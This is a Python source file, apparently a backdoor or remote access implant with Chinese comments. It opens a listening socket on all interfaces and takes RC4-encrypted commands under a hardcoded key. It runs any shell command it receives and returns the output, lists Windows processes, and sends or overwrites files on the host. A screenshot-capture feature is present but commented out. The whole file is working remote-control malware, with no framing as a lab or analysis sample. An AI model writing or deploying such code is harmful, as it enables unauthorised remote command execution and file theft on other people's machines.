import socket
import os
import subprocess
import threading
from queue import Queue
# from PIL import ImageGrab

key ='qazwsxedqazwsxed'

def rc4_setup(key):
    if isinstance(key,str):
        key = key.encode()
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key [i % len(key)]) % 256
        s[i],s[j] = s[j],s[i]
    return s
def rc4_crypt(data,key):
    if isinstance(data,str):
        data = data.encode()
    s = rc4_setup(key)
    i, j = 0, 0
    res = []
    for byte in data:
        i =(i +1)%256
        j =(j+s[i])%256
        s[i],s[j]=s[j],s[i]
        res.append(byte^s[(s[i]+ s[j])%256])

    # print("加解密后长度:",len(res))
    return bytes(res)

def Rc4_Encrypt(data,key):
    # print("加密前长度:",len(data))
    return rc4_crypt(data,key)
def Rc4_Decrypt(data,key):
    # print("解密前长度:",len(data))
    return rc4_crypt(data,key)


# 线程池大小
THREAD_POOL_SIZE = 10

def handle_client(client_socket, addr):
    print(f"New connection from {addr}")
    try:
        while True:
            data = client_socket.recv(1000000)#.decode('utf-8', 'ignore')
            if not data:
                break  # 客户端关闭了连接

            try:
                data = Rc4_Decrypt(data, key).decode('utf-8', 'ignore')
            except Exception as e:
                print(f"Decryption error from {addr}: {e}")
                continue
            print(f"Received command: {data}")

            command = data.split(' ', 1)
            if command[0] == 'shell':
                execute_shell_command(client_socket, command[1])
            elif command[0] == 'w':
                list_processes(client_socket)
            elif command[0] == 'do':
                send_file(client_socket, command[1])
            elif command[0] == 'du':
                receive_file(client_socket, command[1])
            # elif command[0] == 'xs':
            #     take_screenshot(client_socket)
            else:
                client_socket.sendall(b"Unknown command")
    except ConnectionResetError:
        print(f"Client {addr} disconnected")
    except Exception as e:
        print(f"Unexpected error from {addr}: {e}")
    finally:
        client_socket.close()

def execute_shell_command(client_socket, cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        client_socket.sendall(Rc4_Encrypt(result, key))
    except subprocess.CalledProcessError as e:
        client_socket.sendall(Rc4_Encrypt(str(e).encode('utf-8'), key))

def list_processes(client_socket):
    try:
        result = subprocess.check_output("tasklist", shell=True, stderr=subprocess.STDOUT)
        client_socket.sendall(Rc4_Encrypt(result, key))
    except subprocess.CalledProcessError as e:
        client_socket.sendall(Rc4_Encrypt(str(e).encode('utf-8'), key))

def send_file(client_socket, file_name):
    try:
        if os.path.isfile(file_name):
            client_socket.sendall(Rc4_Encrypt(b"Ready to receive file", key))
            with open(file_name, 'rb') as file:
                while True:
                    data = file.read(1000000)
                    if not data:
                        break
                    client_socket.sendall(Rc4_Encrypt(data, key))
            print(f"Sent file {file_name} to client")
        else:
            client_socket.sendall(Rc4_Encrypt(f"File {file_name} not found.".encode('utf-8'), key))
    except Exception as e:
        client_socket.sendall(Rc4_Encrypt(str(e).encode('utf-8'), key))

def receive_file(client_socket, file_name):
    try:
        with open(file_name, 'wb') as file:
            while True:
                data = client_socket.recv(1000000)
                if not data:
                    break
                file.write(Rc4_Decrypt(data,key))
        print(f"Received file {file_name} from client")
    except Exception as e:
        client_socket.sendall(Rc4_Encrypt(str(e).encode('utf-8'), key))

# def take_screenshot(client_socket):
#     try:
#         screenshot = ImageGrab.grab()
#         screenshot.save('screenshot.png')
#         with open('screenshot.png', 'rb') as file:
#             while True:
#                 data = file.read(1000000)
#                 if not data:
#                     break
#                 client_socket.sendall(data)
#         print(f"Sent screenshot to client")
#     except Exception as e:
#         client_socket.sendall(str(e).encode('utf-8'))

def worker(q):
    while True:
        client_socket, addr = q.get()
        handle_client(client_socket, addr)
        q.task_done()

def start_server(host, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Server listening on {host}:{port}")

    # 创建线程池
    q = Queue()
    for _ in range(THREAD_POOL_SIZE):
        threading.Thread(target=worker, args=(q,), daemon=True).start()

    try:
        while True:
            client_socket, addr = server_socket.accept()
            q.put((client_socket, addr))
    except KeyboardInterrupt:
        print("Server stopped by user")
    finally:
        server_socket.close()

start_server('0.0.0.0', 12345)